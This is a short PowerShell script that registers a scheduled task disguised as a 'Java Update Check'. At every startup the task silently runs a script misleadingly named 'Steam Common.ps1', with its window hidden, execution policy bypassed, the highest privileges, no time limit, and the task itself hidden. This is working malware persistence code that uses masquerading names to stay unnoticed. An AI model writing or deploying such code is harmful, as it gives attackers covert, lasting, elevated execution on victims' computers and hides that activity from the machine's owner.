$TaskName   = "Java Update Check"
$ScriptPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Steam Common.ps1"

$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -File `"$ScriptPath`""
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Principal = New-ScheduledTaskPrincipal -UserId $CurrentUser -RunLevel Highest
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force

$task = Get-ScheduledTask -TaskName $TaskName
$task.Settings.ExecutionTimeLimit = "PT0S"
Set-ScheduledTask -TaskName $TaskName -Settings $task.Settings

Start-ScheduledTask -TaskName $TaskName
